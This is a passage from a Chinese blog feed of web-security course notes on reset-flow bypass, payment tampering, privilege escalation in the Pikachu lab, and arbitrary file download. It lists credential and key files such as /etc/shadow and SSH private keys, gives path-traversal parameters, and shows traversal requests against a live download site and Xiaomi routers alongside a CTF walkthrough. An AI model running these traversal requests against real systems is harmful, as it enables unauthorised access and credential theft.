href="https://www.cnblogs.com/nul1/p/12071115.html">https://www.cnblogs.com/nul1/p/12071115.html</a></li><li><a href="https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2">https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2</a></li><li><a href="https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0">https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>35WEB漏洞-逻辑越权之找回机制及接口爆破</title>
      <link href="/2021/09/21/35WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/"/>
      <url>/2021/09/21/35WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="找回重置机制"><a href="#找回重置机制" class="headerlink" title="找回重置机制"></a>找回重置机制</h3><h4 id="客户端回显"><a href="#客户端回显" class="headerlink" title="客户端回显"></a>客户端回显</h4><p>点击获取验证码后，会在数据包中回显验证码内容，而不需要去接收手机或者邮箱的验证码，这种称为客户端回显。</p><h4 id="Response-状态值"><a href="#Response-状态值" class="headerlink" title="Response 状态值"></a>Response 状态值</h4><p>当我们随便输入一个验证码，发送给服务器，服务器会返回一个错误的标志来告诉客户端，如果我们将返回的数据包进行拦截，那么如果客户端验证的这个结果不是依据服务器的话，就会成功验证。</p><h4 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h4><p>当验证码长度较短的时候，比如说4位数字，就可以使用爆破工具进行验证码爆破</p><h4 id="找回流程绕过"><a href="#找回流程绕过" class="headerlink" title="找回流程绕过"></a>找回流程绕过</h4><p>一般我们在找回密码时，第一步会先验证手机的验证码，第一步通过后，第二步会进行修改密码。我们抓取第二步修改密码的数据包，当我们随机修改一个账号的密码时，直接将第二步的数据包复制上去，就可以绕过第一步验证流程。</p><h3 id="接口调用乱用"><a href="#接口调用乱用" class="headerlink" title="接口调用乱用"></a>接口调用乱用</h3><p>短信轰炸，来电轰炸等</p><h3 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h3><ul><li><a href="http://downcode.com/downcode/j_16621.shtml">http://downcode.com/downcode/j_16621.shtml</a></li><li><a href="https://pan.baidu.com/s/1P73QFmEhY6f350CvmnOJNg">https://pan.baidu.com/s/1P73QFmEhY6f350CvmnOJNg</a> 提取码：xiao</li><li><a href="https://pan.baidu.com/s/1N963jFjTefNc6Gnso-RHmw">https://pan.baidu.com/s/1N963jFjTefNc6Gnso-RHmw</a> 提取码：xiao</li><li><a href="https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>34WEB漏洞-逻辑越权之支付数据篡改安全</title>
      <link href="/2021/09/21/34WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%94%AF%E4%BB%98%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E5%AE%89%E5%85%A8/"/>
      <url>/2021/09/21/34WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%94%AF%E4%BB%98%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="登录应用功能点安全问题"><a href="#登录应用功能点安全问题" class="headerlink" title="登录应用功能点安全问题"></a>登录应用功能点安全问题</h3><p><strong>检测</strong></p><p>存在登录功能的位置</p><p><strong>危害</strong></p><p>不用账号密码，直接登录</p><h4 id="登录点暴力破解"><a href="#登录点暴力破解" class="headerlink" title="登录点暴力破解"></a>登录点暴力破解</h4><p>如果数据包传输的账号密码没有加密或加密方式已知，可以尝试暴力破解</p><h4 id="HTTP-HTTPS-传输"><a href="#HTTP-HTTPS-传输" class="headerlink" title="HTTP/HTTPS 传输"></a>HTTP/HTTPS 传输</h4><p>HTTP是明文传输的，也就是说我们在进行密码登录的时候，账号和密码是没有加密的。这种我们是可以直接进行爆破的。</p><p>而HTTPS在传输过程中是进行加密的，在进行登录的时候如果我们无法得知他的加密形式，是无法爆破的，当然有的时候也没有加密，具体情况可以碰到了看一下数据包。</p><h4 id="Cookie-脆弱点验证"><a href="#Cookie-脆弱点验证" class="headerlink" title="Cookie 脆弱点验证"></a>Cookie 脆弱点验证</h4><p>代码审计</p><p>看看Cookie有无可操作的值，调整那些跟你登录页面有关的项，看是否会影响功能。如修改“user”的值</p><h4 id="Session-固定点测试"><a href="#Session-固定点测试" class="headerlink" title="Session 固定点测试"></a>Session 固定点测试</h4><h4 id="验证密文比对安全测试"><a href="#验证密文比对安全测试" class="headerlink" title="验证密文比对安全测试"></a>验证密文比对安全测试</h4><h3 id="数据篡改安全问题"><a href="#数据篡改安全问题" class="headerlink" title="数据篡改安全问题"></a>数据篡改安全问题</h3><h4 id="挖洞技巧：支付漏洞之总结"><a href="#挖洞技巧：支付漏洞之总结" class="headerlink" title="挖洞技巧：支付漏洞之总结"></a>挖洞技巧：支付漏洞之总结</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.secpulse.com/archives/67080.html</span><br></pre></td></tr></table></figure><h4 id="商品购买流程："><a href="#商品购买流程：" class="headerlink" title="商品购买流程："></a>商品购买流程：</h4><p>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付</p><h4 id="常见篡改参数："><a href="#常见篡改参数：" class="headerlink" title="常见篡改参数："></a>常见篡改参数：</h4><p>商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等</p><h4 id="常见修改方法："><a href="#常见修改方法：" class="headerlink" title="常见修改方法："></a>常见修改方法：</h4><p>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p><h3 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h3><ul><li><a href="https://www.zblogcn.com/zblogphp/">https://www.zblogcn.com/zblogphp/</a></li><li><a href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a></li><li><a href="https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg">https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg</a> 提取码：xiao</li><li><a href="https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg">https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg</a> 提取码：xiao</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>33WEB漏洞-逻辑越权之水平垂直越权全解</title>
      <link href="/2021/09/21/33WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/"/>
      <url>/2021/09/21/33WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109172036364.png" alt="image-20210917203653188" style="zoom:67%;" /><h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p><strong>原理</strong></p><p>通过更换的某个 ID 之类的身份标识，从而使 A 账号获取（修改、删除等）B 账号数据。</p><h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p><strong>原理</strong></p><p>使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。</p><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p><strong>原理</strong></p><p>通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作。</p><h3 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h3><h4 id="Pikachu-本地水平垂直越权演示（漏洞成因）"><a href="#Pikachu-本地水平垂直越权演示（漏洞成因）" class="headerlink" title="Pikachu-本地水平垂直越权演示（漏洞成因）"></a>Pikachu-本地水平垂直越权演示（漏洞成因）</h4><p><strong>水平越权</strong></p><p>首先我们查看koby用户的信息</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119537.png" alt="image-20210917204306986"></p><p>我们抓包发现参数有username，我们试着把username修改为其他用户，能不能达到一个水平越权的效果呢。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br><span class="line">Cookie: csrftoken=vKkecYAHNQy0hBzIqkW7oaJw91c8w1DPtQhCAWIXKPPgjuxTF3uii1r7lXPlDHeL; PHPSESSID=f269db34aa678e173b4b5da42cd715e4</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br></pre></td></tr></table></figure><p>如何知道其他用户的用户名呢，可以通过注册时，该用户名已存在或者网站其他信息来进行收集。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109172046893.png" alt="image-20210917204613800"></p><p>可以看到这里我通过修改name为lucy获取到了其他用户的信息。</p><p><strong>垂直越权</strong></p><p>前提条件</p><p>如何获取admin添加用户数据包</p><ol><li>普通用户前端有操作界面可以抓取数据包</li><li>通过网站源码进行本地复现抓取</li><li>盲猜</li></ol><p>有两个用户一个是<code>admin/123456</code>一个是<code>pikachu/000000</code>。其中admin是超级用户</p><p>通过抓取admin用户添加其他用户的数据包</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119554.png" alt="image-20210917210113824"></p><p>然后登录普通用户，尝试利用抓取的数据包进行创建用户。发现创建失败，这是因为当前admin用户的Cookie已经失效，我们换成pikachu的用户进行尝试，发现创建成功。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119615.png" alt="image-20210917210438333"></p><p>这就是垂直越权，通过普通用户的权限却执行了admin用户的事。</p><p>类似的还有通过修改普通用户密码，将管理员密码修改成功也是垂直越权。</p><h4 id="越权检测-小米范越权漏洞检测工具（工具使用）"><a href="#越权检测-小米范越权漏洞检测工具（工具使用）" class="headerlink" title="越权检测-小米范越权漏洞检测工具（工具使用）"></a>越权检测-小米范越权漏洞检测工具（工具使用）</h4><h4 id="越权检测-Burpsuite-插件-Authz-安装测试（插件使用）"><a href="#越权检测-Burpsuite-插件-Authz-安装测试（插件使用）" class="headerlink" title="越权检测-Burpsuite 插件 Authz 安装测试（插件使用）"></a>越权检测-Burpsuite 插件 Authz 安装测试（插件使用）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_33736666/article/details/113376904</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32WEB漏洞-文件操作之文件下载读取全解</title>
      <link href="/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/"/>
      <url>/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119186.png" alt="image-20210917093013895"></p><h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>一些提供了文件查看或者下载功能的web应用在对用户查看或下载的文件没有限制的情况下，导致恶意用户能够查看或下载任意敏感文件</p><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p><strong>白盒</strong></p><ul><li>代码审计</li></ul><p><strong>黑盒</strong></p><ul><li>公开漏洞</li><li>漏扫工具</li><li>手工看参数值及功能</li></ul><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p> <strong>常见文件</strong></p><p>后台日志等可见的文件</p><p><strong>敏感文件</strong></p><ul><li>数据库配置文件</li><li>各种接口文件</li><li>密钥信息等文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">C:\boot.ini //查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</span><br><span class="line">C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini //Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">C:\Windows\php.ini //php配置信息</span><br><span class="line">C:\Windows\my.ini //Mysql配置信息</span><br><span class="line"></span><br><span class="line">Linux</span><br><span class="line">/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去</span><br><span class="line">/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub</span><br><span class="line">/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</span><br><span class="line">/etc/passwd // 账户信息</span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line">/etc/my.cnf //mysql 配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line">/root/.bash_history //用户历史命令记录文件</span><br><span class="line">/root/.mysql_history //mysql历史命令记录文件</span><br><span class="line">/proc/self/fd/fd[0-9]*(文件标识符)</span><br><span class="line">/proc/mounts //记录系统挂载设备</span><br><span class="line">/porc/config.gz //内核配置文件</span><br><span class="line">/var/lib/mlocate/mlocate.db //全文件路径</span><br><span class="line">/porc/self/cmdline //当前进程的cmdline参数</span><br><span class="line"></span><br><span class="line">java+apache站点:</span><br><span class="line">/conf/tomcat-users.xml</span><br><span class="line">/WEB-INF/classes/applicationContext.xml</span><br><span class="line">/WEB-INF/web.xml</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line"></span><br><span class="line">nginx服务器:</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br><span class="line">/usr/local/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><h4 id="下载参数"><a href="#下载参数" class="headerlink" title="下载参数"></a>下载参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">read.xxx?filename=</span><br><span class="line">down.xxx?filename=</span><br><span class="line">readfile.xxx?file=</span><br><span class="line">downfile.xxx?file=</span><br><span class="line">../ ..\ .\ ./等</span><br><span class="line">%00 ? %23 %20 .等</span><br><span class="line">&amp;readpath=、&amp;filepath=、&amp;path=、&amp;inputfile=、&amp;url=、&amp;data=、&amp;readfile=、&amp;menu=、META-INF= 、</span><br><span class="line">WEB-INF</span><br></pre></td></tr></table></figure><h4 id="各种协议调用配合"><a href="#各种协议调用配合" class="headerlink" title="各种协议调用配合"></a>各种协议调用配合</h4><p><strong>Javaweb 文件下载代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">String path = request.getContextPath();</span><br><span class="line">String basePath =</span><br><span class="line">request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;a href=&quot;/download/DownloadServlet?filename=1.jpg&quot;&gt;文件下载&lt;/a&gt;</span><br><span class="line">public void doGet(HttpServletRequest request, HttpServletResponse response)</span><br><span class="line">throws ServletException, IOException &#123;</span><br><span class="line">response.setCharacterEncoding(&quot;UTF-8&quot;);</span><br><span class="line">//设置 ContentType 字段值</span><br><span class="line">response.setContentType(&quot;text/html;charset=utf-8&quot;);</span><br><span class="line">//获取所要下载的文件名称</span><br><span class="line">String filename = request.getParameter(&quot;filename&quot;);</span><br><span class="line">//下载文件所在目录</span><br><span class="line">String folder = &quot;/filename/&quot;;</span><br><span class="line">//通知浏览器以下载的方式打开</span><br><span class="line">response.addHeader(&quot;Content-type&quot;, &quot;appllication/octet-stream&quot;);</span><br><span class="line">response.addHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=&quot;+filename);</span><br><span class="line">//通知文件流读取文件</span><br><span class="line">InputStream in = getServletContext().getResourceAsStream(folder+filename);</span><br><span class="line">//获取 response 对象的输出流</span><br><span class="line">OutputStream out = response.getOutputStream();</span><br><span class="line">byte[] buffer = new byte[1024];</span><br><span class="line">int len;</span><br><span class="line">//循环取出流中的数据</span><br><span class="line">while((len = in.read(buffer)) != -1)&#123;</span><br><span class="line">out.write(buffer,0,len);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="涉及案例："><a href="#涉及案例：" class="headerlink" title="涉及案例："></a>涉及案例：</h3><h4 id="Pikachu-文件下载测试-参数"><a href="#Pikachu-文件下载测试-参数" class="headerlink" title="Pikachu-文件下载测试-参数"></a>Pikachu-文件下载测试-参数</h4><p>点击图片会进行下载，下载链接如下，可以很容易看出是文件下载漏洞，只需要修改filename后面的参数就可以下载任意文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png</span><br></pre></td></tr></table></figure><p>图片链接地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/download/kb.png</span><br></pre></td></tr></table></figure><p>可以看到他们不在一个目录下，这里我试着下载一下<code>execdownload.php</code>文件，所有需要退一级目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119125.png" alt="image-20210917104937450"></p><p>可以看到我们成功下载了这个文件。那么我们是不是可以下载配置文件呢！查看我们刚下载的文件发现有一个配置文件。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119040.png" alt="image-20210917105047042"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../inc/function.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119082.png" alt="image-20210917105316786"></p><p>成功下载到该文件</p><h4 id="Zdns-文件下载真实测试-功能点"><a href="#Zdns-文件下载真实测试-功能点" class="headerlink" title="Zdns-文件下载真实测试-功能点"></a>Zdns-文件下载真实测试-功能点</h4><p>当我们点击下载后会进行下载</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119221.png" alt="image-20210917105737348"></p><p>复制下载链接发现问题，这里用了base64加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMTA4MDYveXN0cHpzXzEuMS43X2RhbmdiZWkuYXBr</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119120.png" alt="image-20210917105906515"></p><p>可以看到经过解密发现，这里加密的内容和我们下载的名字一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">L2Rvd24vMjAyMTA4MDYveXN0cHpzXzEuMS43X2RhbmdiZWkuYXBr</span><br><span class="line"></span><br><span class="line">解密:</span><br><span class="line"></span><br><span class="line">/down/20210806/ystpzs_1.1.7_dangbei.apk</span><br></pre></td></tr></table></figure><p>我们下载一下他的html文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://down.znds.com/getdownurl/?s=../apk/app/2019/0909/7206.html</span><br><span class="line">加密后</span><br><span class="line">http://down.znds.com/getdownurl/?s=Li4vYXBrL2FwcC8yMDE5LzA5MDkvNzIwNi5odG1s</span><br></pre></td></tr></table></figure><p>链接被重置了。。但是漏洞应该存在</p><h4 id="小米路由器-文件读取真实测试-漏洞"><a href="#小米路由器-文件读取真实测试-漏洞" class="headerlink" title="小米路由器-文件读取真实测试-漏洞"></a>小米路由器-文件读取真实测试-漏洞</h4><p>fofa中可以找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxx:8888/api-third-party/download/extdisks../etc/shadow</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119690.png" alt="image-20210917111357871"></p><p>可以看到我们可以成功下载到他的文件</p><h4 id="RoarCTF2019-文件读取真题复现-比赛"><a href="#RoarCTF2019-文件读取真题复现-比赛" class="headerlink" title="RoarCTF2019-文件读取真题复现-比赛"></a>RoarCTF2019-文件读取真题复现-比赛</h4><p>可以看到这个链接存在一个文件下载漏洞，因为是java环境，所有他的配置文件目录是<code>/WEB-INF/web.xml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4f51f59a-99ce-4c6a-8827-f3a83c98ce38.node4.buuoj.cn:81/Download?filename=help.docx</span><br></pre></td></tr></table></figure><p>这里修改下载参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4f51f59a-99ce-4c6a-8827-f3a83c98ce38.node4.buuoj.cn:81/Download?filename=/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119696.png" alt="image-20210917111714361"></p><p>这里有个小知识点返回这个错误，表示java接收的是POST参数，不是GET</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119954.png" alt="image-20210917111818578"></p><p>这里成功下载到配置文件</p><p>然后打开发现了flag的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;  &lt;-</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure><p>熟悉javaweb开发的应该知道，此处指的路径是<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><p>根据该路径成功下载到flag文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3thM2E1ZDFkOC0xY2UwLTQwNDMtYTAzMi1mYzE4ODYzZDVjMzR9Cg==</span><br></pre></td></tr></table></figure><p>经过解密成为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a3a5d1d8-1ce0-4043-a032-fc18863d5c34&#125;</span><br></pre></td></tr></table></figure><h4 id="百度杯-2017-二月-Zone-真题复现-比赛拓展"><a href="#百度杯-2017-二月-Zone-真题复现-比赛拓展" class="headerlink" title="百度杯 2017 二月-Zone 真题复现-比赛拓展"></a>百度杯 2017 